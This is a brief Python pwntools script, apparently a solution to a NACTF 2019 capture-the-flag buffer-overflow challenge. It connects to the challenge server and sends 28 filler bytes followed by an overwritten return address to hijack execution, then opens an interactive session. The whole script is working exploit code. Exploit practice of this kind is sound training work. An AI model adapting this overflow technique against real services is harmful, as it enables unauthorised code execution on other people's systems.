from pwn import *

#p = process('./bof')
p = remote('shell.2019.nactf.com' ,'31462')
payload = "A"*28
payload += p32(0x080491b2)


p.sendline(payload)
p.interactive()
